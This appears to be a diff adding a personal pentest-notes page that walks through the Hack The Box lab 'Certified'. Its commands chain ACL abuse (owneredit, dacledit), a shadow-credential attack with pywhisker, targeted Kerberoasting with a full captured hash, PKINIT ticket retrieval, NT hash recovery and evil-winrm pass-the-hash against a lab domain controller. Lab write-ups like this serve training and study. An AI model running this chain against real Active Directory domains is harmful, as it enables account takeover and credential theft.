+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/5-crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/5-crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open open>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/caption/">Caption</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/6-lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details open>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/4-services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>Certified</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				
+			</nav>
+			<p>#Shadow_credential
+Target : 10.10.11.41</p>
+<p>Scan :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">53/tcp   open  domain
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-05-13T15:49:36
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-05-13T15:49:36
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-11-24T16:20:06+00:00<span class="p">;</span> +7h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5
+</span></span><span class="line"><span class="cl">593/tcp  open  http-rpc-epmap
+</span></span><span class="line"><span class="cl">636/tcp  open  ldapssl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-05-13T15:49:36
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-05-13T15:49:36
+</span></span><span class="line"><span class="cl">3268/tcp open  globalcatLDAP
+</span></span><span class="line"><span class="cl">3269/tcp open  globalcatLDAPssl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-05-13T15:49:36
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-05-13T15:49:36</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>
+<p>Initial credential :
+<code>judith.mader : judith09</code></p>
+</li>
+<li>
+<p>Users found :</p>
+</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Management
+</span></span><span class="line"><span class="cl">management_svc
+</span></span><span class="line"><span class="cl">ca_operator
+</span></span><span class="line"><span class="cl">alexander.huges
+</span></span><span class="line"><span class="cl">harry.wilson
+</span></span><span class="line"><span class="cl">gregory.cameron</span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bloodhound-python -d <span class="s1">&#39;certified.htb&#39;</span> -u <span class="s1">&#39;judith.mader&#39;</span> -p <span class="s1">&#39;judith09&#39;</span> -ns 10.10.11.41 -dc DC01.certified.htb -c all</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Write Owner ACL :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">owneredit.py -action write -new-owner <span class="s1">&#39;judith.mader&#39;</span> -target <span class="s1">&#39;MANAGEMENT&#39;</span> <span class="s1">&#39;certified.htb&#39;</span>/<span class="s1">&#39;judith.mader&#39;</span>:<span class="s1">&#39;judith09&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">dacledit.py -action <span class="s1">&#39;write&#39;</span> -rights <span class="s1">&#39;WriteMembers&#39;</span> -principal <span class="s1">&#39;judith.mader&#39;</span> -target-dn <span class="s1">&#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&#39;</span> <span class="s1">&#39;certified.htb&#39;</span>/<span class="s1">&#39;judith.mader&#39;</span>:<span class="s1">&#39;judith09&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">net rpc group addmem <span class="s2">&#34;MANAGEMENT&#34;</span> <span class="s2">&#34;judith.mader&#34;</span> -U <span class="s2">&#34;certified.htb&#34;</span>/<span class="s2">&#34;judith.mader&#34;</span>%<span class="s2">&#34;judith09&#34;</span> -S <span class="s2">&#34;DC01.certified.htb&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Generic write :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 pywhisker.py -d <span class="s2">&#34;certified.htb&#34;</span> -u <span class="s2">&#34;judith.mader&#34;</span> -p <span class="s2">&#34;judith09&#34;</span> --target <span class="s2">&#34;management_svc&#34;</span> --action <span class="s2">&#34;list&#34;</span>
+</span></span><span class="line"><span class="cl">python3 pywhisker.py -d <span class="s2">&#34;certified.htb&#34;</span> -u <span class="s2">&#34;judith.mader&#34;</span> -p <span class="s2">&#34;judith09&#34;</span> --target <span class="s2">&#34;management_svc&#34;</span> --action <span class="s2">&#34;add&#34;</span> --filename key --export PEM</span></span></code></pre></div>
+  </figure>
+</div>
+<p><code>Not working ... , My bad it works</code></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>Nov 24, <span class="m">2024</span> - 11:13:08 <span class="o">(</span>CET<span class="o">)]</span> exegol-Kraken pywhisker <span class="c1"># targetedKerberoast.py -v -d &#39;certified.htb&#39; -u &#39;judith.mader&#39; -p &#39;judith09&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Printing <span class="nb">hash</span> <span class="k">for</span> <span class="o">(</span>management_svc<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>management_svc<span class="nv">$CERTIFIED</span>.HTB<span class="nv">$certified</span>.htb/management_svc*<span class="nv">$347</span>d9440e08d552b9f7fd2c86c0d67b1<span class="nv">$a75cf4ebbff8c627819e52b02ea06dc744b856b03b5b48b1b34ec6bb1bc811e76b30414328e78dd1d8e5f7ce8d16b655d73341ad31c9082352e00bac3db801d6d00a41db0043ac6e765d465d2e7212832877497db297683dd364d88f1a1beee2201a780608a231dea290ffe766581151c0e42720962fe7a04ca52b3a05094052c527600abb4ba78c41d3bbe012fc899edc6387899b04c4231a2d3e1f4239f4159508ce82b5cae73f4a3765341da181c2d704917e55960d0d230f634118ea749a8ecdfae6b1fe5476fad0b2be0c0e3f4c8e52079027224914c325e1e5dc08750239132373e8feafafe888b84ad3b70a081b89f64edea1afe36574ab3fec4dcf693bb9a6ee9626e29b9ce1c13a756dc4de44f8275ffff033de18d9c30399aea39c8609512995b768a045de1576c877a5371c2eb9d9d3f802b3167cb91277bafbf0e0ea963518b39ed1fd9480c24410f447af4a175e7727e67a593cb97612af3a18d9910d33876d536f5857ff69b7511294692f6cd3ef467136801bb2585ae80d01372d62c236052b1ca69badec1abe4d93cb744dd81d7d82edbad9c3038314a946c1c0afce9705ba822897689c091577bc70ee605409cd6ba5180a48e6f4eb954e1e4eb865b4b23bb9af3b1b955d6ce8f647cb636054f4fcf1989e3488a4eb41548820bcb626c17302a8c8311fb9ca7f688d5d58e0136c173327376b21094499bfe057b032d33a402becbc5247df02803b113ddece0e7d743a4aaa5e4d9b6d9b5a8a0a80db72c506400d88a237f4f943617be7070fd48a2896612bb319a0fedb8db404b66c09de0fa7f1ddccc82aced343a6910c0255c8c17366d88ff3cd0642a7f840271cccbdb8cdef253b17740dd1bec0672f1f6ba9be16e27c64e18bee537dbb19a39cabce1c1bd32c13ccbfdb9f074a2ca717b5b22f15589b03027a74500a743ca30d75318cf8b35352d9470083d389f0548b70ac65f7c2f9a549675c786e18cfae652548d82af2aed789feef1442e4f4c7df36505b4f89735544440212e49d34d7e9cb6c707c08a1c22cc7dc0dcf286ffa10d713a21d1b88611cc45f87691f082d86deeceecd5fe9c2f51c61dd6552c2651c404b4fd5afde44fa32e93ee4b3040b6fd5cf8cd96589cec5a0aad0403ff8af9403cea9fbdfd9c30bb3d1750fe3e05673504cb957cdd748b6174bca133c8f8d5b6189e8a0dab82aac132fba6ef54cc6382a9fdaa26ef94fdd73577cc3781453471cfc92fb486128d9e458da7ed2c1dd63f50257e0a3f3022598c455c03806fa77e9f288ae97c77c46aaee4db098cb9e0c430fc0fe2134f2a1e8cfc86d784298bd94d020c9adf95a849c66574ce2d84b8dfac246271223216ff9e8b12c42040811d899dd9f6cc8cac518197eedc4f00a25568189128bf789ab6d5fc4b4c508914088008a6da9b230c2e5fda03c9510e8f759f4f6f70d2b4073a2fc06e1d4b86e5756673e5a9077e9853a53faafb955b37c64f38c9b92a15076e233febd80a5d5364de8618466cd5c3779a19beb7f5b0cdfbf69c1174f19e8b6b22a5a8855a46c771d87d2fa835c8c1c1e9ea9007b3d</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><code>Can't crack it </code></p>
+<ul>
+<li>Get a tgt with the certificate :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gettgtpkinit.py -cert-pfx <span class="s2">&#34;ACpe7bSn.pfx&#34;</span> -pfx-pass <span class="s2">&#34;jm2eQRJ4KGuPQ11LUSu7&#34;</span> <span class="s2">&#34;certified.htb/management_svc&#34;</span> <span class="s2">&#34;TGT_CCACHE_FILE&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or</span>
+</span></span><span class="line"><span class="cl">gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem certified.htb/management_svc management.ccache
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>management.ccache</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Recover the Nt hash :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">getnthash -key <span class="s2">&#34;725378f2fe6e5decc64e196fcd98ea97a20cebbe5d60e83806d6356c9be52178&#34;</span> certified.htb/management_svc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">a091c1832bcdd4677c28b5a6a1295584</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Pass the hash :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">evil-winrm -u <span class="s2">&#34;management_svc&#34;</span> -H <span class="s2">&#34;a091c1832bcdd4677c28b5a6a1295584&#34;</span> -i <span class="s2">&#34;</span><span class="nv">$t</span><span class="s2">&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/6-lab/htb/caption/" class="stretched-link text-reset text-decoration-none">Caption</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/6-lab/htb/cicada/" class="stretched-link text-reset text-decoration-none">Cicada</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
